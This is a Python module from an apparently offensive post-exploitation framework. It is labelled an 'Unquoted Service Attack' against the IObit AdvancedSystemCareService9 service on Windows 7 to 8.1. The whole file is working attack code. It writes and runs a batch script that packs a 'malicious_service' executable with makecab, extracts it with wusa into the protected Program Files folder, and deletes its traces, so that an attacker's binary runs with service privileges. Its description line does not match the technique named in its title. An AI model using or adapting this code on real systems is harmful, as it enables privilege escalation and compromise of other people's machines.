from os import system, getcwd
from subprocess import check_call

from module import Module


class BoomerModule(Module):

    def __init__(self):
        info = {
            "Name": "Unquoted Service Attack",
            "Description": "Look for .exe with autoElevate true",
            "OS": "Windows 7, 8, 8.1",
            "Author": "Josue Encinar",
        }
        options = {
            "malicious_service": ["Service .exe to copy", "C:\\Users\\Josue\\Desktop\\Advanced.exe", True],
            "destination": ["Path to paste .exe", '"C:\\Program Files (x86)\\IObit"', True],
            "service_name": ["Service name", "AdvancedSystemCareService9", True]
        }
        super(BoomerModule, self).__init__(options, info)

    def run(self):
        self.print_info(
            f'Moving {self.options["malicious_service"][1]} to {self.options["destination"][1]}'
        )
        evil = getcwd() + "\\evil.tmp"
        data = """
        @echo off
        makecab %s %s
        @echo.
        echo 'makecab done'
        wusa %s /extract:%s
        echo 'wusa done!'
        del %s
        """ % (self.options["malicious_service"][1], evil, evil, self.options["destination"][1], evil)
        with open("tmp.bat", "w") as f:
            f.write(data)

        check_call(["tmp.bat"])
        system("del tmp.bat > $null")
